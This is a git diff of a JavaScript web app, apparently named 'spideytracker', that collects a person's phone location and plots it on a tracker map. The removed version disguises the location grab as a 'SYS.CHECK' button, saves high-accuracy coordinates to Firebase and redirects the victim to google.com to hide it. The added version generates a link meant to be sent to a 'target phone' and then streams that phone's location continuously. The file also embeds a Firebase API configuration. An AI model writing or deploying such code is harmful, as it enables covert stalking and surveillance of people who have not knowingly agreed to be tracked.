@@ -1,79 +1,130 @@
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
 // --- CONFIGURACIÓN DE FIREBASE ---
 const firebaseConfig = {
-  apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
-  authDomain: "spideytracker-591bb.firebaseapp.com",
-  projectId: "spideytracker-591bb",
-  storageBucket: "spideytracker-591bb.firebasestorage.app",
-  messagingSenderId: "923704989530",
-  appId: "1:923704989530:web:74debc7597acbc80a00563",
-  measurementId: "G-RFC57L9T0Y"
+    apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
+    authDomain: "spideytracker-591bb.firebaseapp.com",
+    projectId: "spideytracker-591bb",
+    storageBucket: "spideytracker-591bb.firebasestorage.app",
+    messagingSenderId: "923704989530",
+    appId: "1:923704989530:web:74debc7597acbc80a00563",
+    measurementId: "G-RFC57L9T0Y"
 };
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
+// Inicializar Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-// --- LÓGICA DE LA APLICACIÓN ---
-document.addEventListener("DOMContentLoaded", () => {
-    const sysCheckBtn = document.getElementById("sysCheckBtn");
-    const mapContainer = document.getElementById("map");
+let map;
+let marker;
+const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
-    if (mapContainer) {
-        // --- MODO CONSOLA (Mapa y Arañas 🕷️) ---
-        const map = L.map('map').setView([0, 0], 2);
-        
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap contributors'
-        }).addTo(map);
+// Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
+const urlParams = new URLSearchParams(window.location.search);
+const targetId = urlParams.get('target');
 
-        const spiderIcon = L.divIcon({
-            className: 'spider-marker',
-            html: '<div style="font-size: 24px; text-align: center;">🕷️</div>',
-            iconSize: [30, 30],
-            iconAnchor: [15, 15]
-        });
+document.addEventListener("DOMContentLoaded", function () {
+    // Inicializar el mapa
+    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
 
-        db.collection("locations").onSnapshot((snapshot) => {
-            snapshot.docChanges().forEach((change) => {
-                if (change.type === "added") {
-                    const data = change.doc.data();
-                    const lat = data.latitude;
-                    const lng = data.longitude;
-                    const timestamp = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'Justo ahora';
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+        attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
 
-                    L.marker([lat, lng], { icon: spiderIcon })
-                        .addTo(map)
-                        .bindPopup(`<b>¡Objetivo localizado!</b><br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}<br>Hora: ${timestamp}`);
+    marker = L.marker(ubicacionPorDefecto).addTo(map)
+        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
+        .openPopup();
 
-                    map.setView([lat, lng], 15);
-                }
-            });
-        });
+    setTimeout(() => { map.invalidateSize(); }, 200);
 
-    } else if (sysCheckBtn) {
-        // --- MODO OBJETIVO (SYS.CHECK) ---
-        sysCheckBtn.addEventListener("click", () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        try {
-                            await db.collection("locations").add({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                timestamp: new Date()
-                            });
-                        } catch (e) {
-                            console.error("Error al registrar posición", e);
-                        }
-                        window.location.href = "https://www.google.com";
-                    },
-                    (error) => {
-                        window.location.href = "https://www.google.com";
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                window.location.href = "https://www.google.com";
-            }
-        });
+    // ESCENARIO A: Si alguien abrió el enlace en su celular (?target=activo)
+    if (targetId) {
+        document.getElementById('banner-status').innerHTML = "TRANSMITIENDO SEÑAL<br>GPS ACTIVO...";
+        iniciarTransmisionRemota(targetId);
+    } else {
+        // ESCENARIO B: Estás en tu consola principal; escuchamos la base de datos
+        escucharObjetivoRemoto("objetivo_principal");
     }
 });
+
+// Botón SHARE LINK: Genera un enlace personalizado para el celular
+window.compartirEnlace = function() {
+    const baseUrl = window.location.origin + window.location.pathname;
+    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
+    
+    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
+        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo. Al abrirlo y aceptar permisos, su ubicación aparecerá en tu mapa.");
+    }).catch(err => {
+        console.error("Error al copiar enlace:", err);
+    });
+};
+
+// Transmitir la ubicación del celular hacia Firebase
+function iniciarTransmisionRemota(id) {
+    if (!navigator.geolocation) {
+        alert("Tu dispositivo no soporta geolocalización.");
+        return;
+    }
+
+    navigator.geolocation.watchPosition(
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            try {
+                // Guarda las coordenadas en tiempo real en Firestore
+                await setDoc(doc(db, "ratreos", id), {
+                    lat: lat,
+                    lng: lng,
+                    timestamp: new Date()
+                });
+                console.log("Coordenadas enviadas a la nube:", lat, lng);
+            } catch (e) {
+                console.error("Error al escribir en la base de datos:", e);
+            }
+        },
+        (error) => {
+            alert("Error de GPS: Asegúrate de dar permisos de ubicación.");
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+    );
+}
+
+// Escuchar la ubicación en tu consola principal (PC)
+function escucharObjetivoRemoto(id) {
+    onSnapshot(doc(db, "ratreos", id), (docSnap) => {
+        if (docSnap.exists()) {
+            const data = docSnap.data();
+            const lat = data.lat;
+            const lng = data.lng;
+
+            map.invalidateSize();
+            map.setView([lat, lng], 16);
+            marker.setLatLng([lat, lng]);
+            marker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
+            
+            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
+        }
+    });
+}
+
+// Funciones secundarias de los botones
+window.obtenerUbicacionActual = function(esInicio = false) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            map.setView([lat, lng], 16);
+            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
+        });
+    }
+};
+
+window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión del enlace...");
+window.centrarUbicacion = () => map.invalidateSize();
+window.cambiarAlerta = (t) => alert("Alerta: " + t);
+window.cambiarPerfil = (n) => alert("Perfil: " + n);
+window.abrirChat = () => alert("Canal de chat seguro abierto.");
+window.verArchivo = () => alert("Abriendo registros históricos...");
